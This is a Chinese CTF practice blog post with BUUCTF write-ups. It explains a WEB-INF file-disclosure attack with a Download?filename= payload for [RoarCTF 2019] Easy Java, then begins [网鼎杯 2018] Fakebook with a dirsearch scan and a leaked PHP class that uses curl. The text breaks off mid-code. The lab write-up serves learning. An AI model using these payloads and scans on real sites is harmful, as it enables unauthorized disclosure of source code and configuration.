
<!DOCTYPE html><html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.29.1" theme-name="Stellar" theme-version="1.29.1">
  
  <meta name="generator" content="Hexo 6.3.0">
  <meta http-equiv='x-dns-prefetch-control' content='on' />
  
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
  <meta name="theme-color" content="#f9fafb">
  
  <title>buuctf刷题3 - Dr4x3zz</title>

  
    <meta name="description" content="# [RoarCTF 2019]Easy Java">
<meta property="og:type" content="article">
<meta property="og:title" content="buuctf刷题3">
<meta property="og:url" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/index.html">
<meta property="og:site_name" content="Dr4x3zz">
<meta property="og:description" content="# [RoarCTF 2019]Easy Java">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a01.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a02.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a03.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a04.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a05.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a06.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a07.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a08.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a09.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a10.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a11.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a12.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a13.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a14.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a21.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a22.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a15.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a16.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a17.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a18.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a19.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a20.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a23.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a24.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a25.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a26.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a27.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a28.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a29.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a30.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a31.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a32.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a33.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a34.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a36.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a37.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a38.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a39-17065149223921.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a40.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a41.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a42.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a43.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a45.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b07.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b08.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b09.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b11.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b10.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b12.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b13.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b14.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b15.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b16.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b17.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b18.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b19.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b20.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b21.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b22.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b23.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b24.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b27.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b28.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b29.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b30.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b31.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b32.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b34.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b35.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b36.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b37.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b38.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b39.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b40.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b41.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b42.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b43.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b44.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b45.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b46.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b47.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c01.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c02.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c03.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c04.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c05.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c06.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c07.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c08.png">
<meta property="og:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c09.png">
<meta property="article:published_time" content="2024-01-27T08:26:08.000Z">
<meta property="article:modified_time" content="2024-10-14T09:52:26.000Z">
<meta property="article:author" content="Dr4x3zz">
<meta property="article:tag" content="buuctf">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a01.png">
  
  
  
  

  <!-- feed -->
  
    <link rel="alternate" href="/atom.xml" title="Dr4x3zz" type="application/atom+xml">
  

  <link rel="stylesheet" href="/css/main.css?v=1.29.1">


  

  

  
</head>
<body>

<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">


<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://raw.githubusercontent.com/Dr4x3zz/picgo/refs/heads/master/yeye.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">Dr4x3zz</div></a></div></header>

<div class="nav-area">
<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>


<nav class="menu dis-select"></nav>
</div>
<div class="widgets">


<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/11/03/MeiYa2022-Individual/"><span class="title">MeiYa2022-Individual</span></a><a class="item title" href="/2024/10/20/MeiYa2023-Individual/"><span class="title">MeiYa2023_Individual</span></a><a class="item title" href="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/"><span class="title">buuctf刷题3</span></a><a class="item title" href="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/"><span class="title">Vulnstack红日靶场</span></a><a class="item title" href="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/"><span class="title">buuctf刷题5</span></a><a class="item title" href="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/"><span class="title">buuctf刷题4</span></a><a class="item title" href="/2024/02/15/hgame2024-week1-Select-Courses%E6%8A%A2%E8%AF%BE%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/"><span class="title">hgame2024_week1_Select_Courses抢课脚本编写学习</span></a><a class="item title" href="/2023/04/23/%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/"><span class="title">鲲鹏杯wp</span></a><a class="item title" href="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/"><span class="title">buuctf刷题2</span></a><a class="item title" href="/2023/09/17/NSSCTF%E5%88%B7%E9%A2%981/"><span class="title">NSSCTF刷题1</span></a></div></widget>
</div>

</div></aside><div class="l_main" id="main">





<div class="article banner top">
  <div class="content">
    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/buuctf/">buuctf</a></div>
<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-01-27T08:26:08.000Z">2024-01-27</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-10-14T09:52:26.000Z">2024-10-14</time></span></div></div></div>
    
    <div class="bottom only-title">
      
      <div class="text-area">
        <h1 class="text title"><span>buuctf刷题3</span></h1>
        
      </div>
    </div>
    
  </div>
  </div><article class="md-text content"><h2 id="roarctf-2019easy-java"><a class="markdownIt-Anchor" href="#roarctf-2019easy-java">#</a> [RoarCTF 2019]Easy Java</h2>
<span id="more"></span>
<p>学习链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/xhy18634297976/article/details/123117897">https://blog.csdn.net/xhy18634297976/article/details/123117897</a></p>
<p>点击 help</p>
<blockquote help.docx>
<p>java.io.FileNotFoundException:</p>
</blockquote>
<p>这里记录一下 Servlet 和 WEB-INF</p>
<blockquote>
<p>Servlet</p>
<p>Java Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。</p>
<p>使用 Servlet，您可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a01.png" alt></p>
<p>具体的可以看：<a target="_blank" rel="noopener" href="https://www.runoob.com/servlet/servlet-intro.html">https://www.runoob.com/servlet/servlet-intro.html</a></p>
<p>WEB-INF</p>
<p>WEB-INF 是 java 的 WEB 应用的安全目录。</p>
<p>1、WEB-INF/web.xml</p>
<p>web 应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</p>
<p>2、WEB-INF/classes</p>
<p>包含了站点所有有用的 class 文件，包括 servlet class 和非 servlet class。</p>
<p>3、WEB-INF/lib</p>
<p>存放 web 应用需要的 JAR 文件。</p>
<p>4、WEB-INF/src</p>
<p>源码目录，按照包名结构放置各个 java 文件。</p>
<p>5、WEB-INF/database.properties</p>
<p>数据库配置文件。</p>
<p>6、WEB-INF/tags</p>
<p>存放了自定义标签文件。</p>
<p>7、WEB-INF/jsp</p>
<p>jsp1.2 以下版本的文件存放位置。</p>
<p>8、WEB-INF/jsp2</p>
<p>存放 jsp2.0 以下版本的文件。</p>
<p>9、META-INF</p>
<p>相当于一个信息包。</p>
</blockquote>
<p>漏洞形成原因：</p>
<p>Tomcat 的 WEB-INF 目录，每个 j2ee 的 web 应用部署文件默认包含这个目录。（对于 j2ee 可以看这个博客：<a target="_blank" rel="noopener" href="https://blog.csdn.net/youtufeitu/article/details/124891927?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170636067716800192265035%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=170636067716800192265035&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2">https://blog.csdn.net/youtufeitu/article/details/124891927?ops_request_misc=%7B%22request%5Fid%22%3A%22170636067716800192265035%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=170636067716800192265035&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2</a><sub>all</sub>top_positive~default-1-124891927-null-null.142<sup>v99</sup>pc_search_result_base7&amp;utm_term=j2ee&amp;spm=1018.2226.3001.4187）</p>
<p>Nginx 在映射静态文件时，把 WEB-INF 目录映射进去，而又没有做 Nginx 的相关安全配置（或 Nginx 自身一些缺陷影响）。从而导致通过 Nginx 访问到 Tomcat 的 WEB-INF 目录（请注意这里，是通过 Nginx，而不是 Tomcat 访问到的，因为上面已经说到，Tomcat 是禁止访问这个目录的。）。</p>
<p>这里对 Nginx 和 Tomcat 的关系也做一点记录：</p>
<blockquote>
<p>nginx 在负载均衡里是前端服务器，用来处理请求的转发（反向代理等）；是静态页面服务器。绝大部分时候他们本身并不会运行项目.</p>
<p>Tomcat 是后端服务器，属于 Java Servlet 容器。用来生成动态页面。是直接用来运行项目的容器。简单来说就是你发出一个请求，先经过 nginx, 它们会合理地把请求分配到后台比较不忙的 Tomcat.Tomcat 会把请求处理好返回给 Nginx, 然后 Nginx 会把最终的结果传送给浏览器。当然，如果是一些静态的数据，Nginx 就可以直接处理了。</p>
</blockquote>
<p>漏洞利用方式：</p>
<p>直接在域名后面加上 WEB-INF/web.xml 就可以了。根据 web.xml 配置文件路径或通常开发时常用框架命名习惯，找到其他配置文件或类文件路径。dump class 文件进行反编译。通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，在通过反编译 class 文件，得到网站源码。</p>
<p>上面的解释我大部分都是直接照搬的，通过大佬的解释应该是获取 web.xml 文件</p>
<p>跟着 wp 走</p>
<p>这里抓包把 get 改成 post</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a02.png" alt></p>
<p>看到 com.wm.ctf.FlagController，试着下载 FlagController.class</p>
<p>构建 payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Download?filename=WEB-INF/classes/com/wm/ctf/FlagController.class</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a03.png" alt></p>
<p>可以看到有一串 base64 加密的内容，解码发现就是 flag</p>
<p f39b749f-41bf-45b9-b915-44766f763c92>flag</p>
<p>flag 拿的挺懵的，对 java 的内容还是接触不多，payload 的构建也是不太懂</p>
<h2 id="网鼎杯-2018fakebook"><a class="markdownIt-Anchor" href="#网鼎杯-2018fakebook">#</a> [网鼎杯 2018] Fakebook</h2>
<p>学习链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_58784379/article/details/120548225">https://blog.csdn.net/qq_58784379/article/details/120548225</a></p>
<p>先用 dirsearch 扫描一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://8d8f949c-e060-4a7c-9ebf-de266c4a5bef.node5.buuoj.cn:81/ -e *</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a04.png" alt></p>
<p>可以看到存在 robots.txt，访问一下</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a05.png" alt></p>
<p>下载下来，打开可以看到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码审计</p>
<p>构造了一个 UserInfo 类，有三个属性，分别是 name、age 和 blog</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ 